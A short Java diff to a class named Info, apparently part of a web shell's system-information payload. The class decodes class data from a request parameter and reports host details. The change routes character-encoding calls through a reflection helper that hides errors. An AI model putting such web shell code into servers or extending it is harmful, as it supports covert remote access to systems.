@@ -26,8 +26,8 @@ public class Info {
 
         try {
             this.response.setContentType("text/html");
-            this.request.setCharacterEncoding(this.cs);
-            this.response.setCharacterEncoding(this.cs);
+            this.setCharacterEncoding(this.request, this.cs);
+            this.setCharacterEncoding(this.response, this.cs);
             this.decoderClassdata = this.decode(this.request.getParameter(var5));
             var2.append(this.SysInfoCode());
         } catch (Exception var8) {
@@ -125,6 +125,14 @@ public class Info {
         }
 
         return this.encoder.equals("base64") ? new String(this.Base64DecodeToByte(var1), this.cs) : var1;
+    }
+
+    void setCharacterEncoding(Object var1, String var2) {
+        try {
+            Method var3 = var1.getClass().getMethod("setCharacterEncoding", new Class[]{String.class});
+            var3.invoke(var1, new Object[]{var2});
+        } catch (Throwable ignored) {
+        }
     }
 
     public byte[] Base64DecodeToByte(String var1) {
